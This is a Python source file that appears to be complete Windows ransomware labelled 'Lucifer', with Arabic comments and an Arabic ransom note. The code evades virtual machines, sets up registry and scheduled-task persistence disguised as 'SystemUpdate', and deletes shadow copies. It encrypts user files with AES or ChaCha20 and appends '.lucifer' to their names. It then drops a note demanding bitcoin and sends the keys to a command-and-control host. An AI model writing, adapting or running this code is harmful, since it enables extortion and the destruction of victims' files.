import os
import sys
import socket
import ctypes
import threading
import subprocess
import platform
from pathlib import Path
from Crypto.Cipher import AES, ChaCha20
from Crypto.Random import get_random_bytes
import requests
import winreg

# إعدادات C2
C2_URL = "https://lucifer-c2.example.com/report"
C2_HOST = "lucifer-c2.example.com"

BITCOIN_ADDRESS = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
VICTIM_ID = f"{socket.gethostname()}-{os.getlogin()}"
KEY_LEN = 32
aes_key = get_random_bytes(KEY_LEN)
chacha_key = get_random_bytes(KEY_LEN)

def is_vm():
    suspicious = ["VBOX", "VMWARE", "QEMU", "SANDBOX"]
    return any(name in platform.platform().upper() for name in suspicious)

def remove_shadows():
    subprocess.call("vssadmin delete shadows /all /quiet", shell=True)

def encrypt_file(path):
    try:
        with open(path, "rb+") as f:
            data = f.read()
            cipher = AES.new(aes_key, AES.MODE_EAX) if len(data) % 2 == 0 else ChaCha20.new(key=chacha_key)
            encrypted = cipher.encrypt(data)
            f.seek(0)
            f.write(encrypted)
            f.truncate()
        os.rename(path, path + ".lucifer")
    except:
        pass

def encrypt_all(user_path):
    for root, _, files in os.walk(user_path):
        for file in files:
            if not file.endswith(".lucifer"):
                threading.Thread(target=encrypt_file, args=(os.path.join(root, file),), daemon=True).start()

def exfiltrate_keys():
    keys = aes_key + chacha_key
    try:
        requests.post(C2_URL, headers={"Host": C2_HOST},
                      data={"id": VICTIM_ID, "key": keys.hex()}, verify=False)
    except:
        pass

def drop_ransom_note():
    note = f"""
    <html><body><h1>تم تشفير ملفاتك</h1>
    <p>أرسل 0.05 BTC إلى:</p>
    <b>{BITCOIN_ADDRESS}</b><br>
    <p>ثم أرسل ID التالي:</p>
    <b>{VICTIM_ID}</b>
    إلى decrypt@protonmail.com</body></html>
    """
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    with open(os.path.join(desktop, "RECOVER_FILES.html"), "w", encoding="utf-8") as f:
        f.write(note)
    # تغيير الخلفية إن كنت تملك warning.png
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("warning.png"), 3)

def install_persistence():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
        subprocess.call(f'schtasks /create /tn "SystemUpdate" '
                        f'/tr "{sys.executable}" /sc hourly /f', shell=True)
    except:
        pass

def main():
    if is_vm():
        sys.exit(0)
    install_persistence()
    remove_shadows()
    encrypt_all(r"C:\Users\Administrator\Desktop\AIRAVAT-main")
    drop_ransom_note()
    exfiltrate_keys()

if __name__ == "__main__":
    main()
